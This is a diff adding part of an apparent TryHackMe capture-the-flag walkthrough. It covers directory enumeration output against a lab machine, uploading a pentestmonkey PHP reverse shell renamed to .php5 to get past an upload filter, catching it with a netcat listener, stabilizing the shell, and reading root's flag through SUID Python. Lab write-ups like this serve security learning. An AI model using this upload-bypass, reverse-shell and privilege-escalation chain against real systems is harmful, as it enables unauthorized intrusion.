@@ -52,3 +52,59 @@ the ports open are : 2
 [11:27:35] 200 -  616B  - /index.php
 [11:27:35] 200 -  616B  - /index.php/login/
 [11:27:36] 301 -  311B  - /js  ->  http://10.10.179.137/js/
+[11:27:49] 301 -  314B  - /panel  ->  http://10.10.179.137/panel/
+[11:27:49] 200 -  732B  - /panel/
+[11:27:57] 403 -  278B  - /server-status
+[11:27:57] 403 -  278B  - /server-status/
+[11:28:06] 301 -  316B  - /uploads  ->  http://10.10.179.137/uploads/
+[11:28:06] 200 -744B  - /uploads/
+```
+the hidden directory is /panel/ and the interesting one is uploads
+
+# Task 3
+1) download a php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), change the LHOST and the port
+```
+wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
+```
+then rename it to bypass file upload restrictions into .php5
+```
+mv php-reverse-shell.php rev.php5
+```
+then upload it and start a netcat listener
+```
+nc -lvnp LPORT
+```
+and now open the rev shell from your browser by visiting http://$IP/uploads/rev.php5
+
+and now you should have a reverse shell
+
+to stabilize your shell run :
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+and
+```
+python -c 'import os; os.system("/bin/bash")'
+```
+now get user.txt
+```
+cat /var/www/user.txt
+THM{********************}
+```
+# Task 4 priv esc
+
+1) after running
+
+```
+find / -user root -perm /4000
+```
+you'll see in the list also python that can be used to read files with higher permissions
+
+answer : /usr/bin/python
+
+3) get the root flag by simply running
+
+```
+python -c 'print(open("/root/root.txt").read())'
+THM{********************}
+```
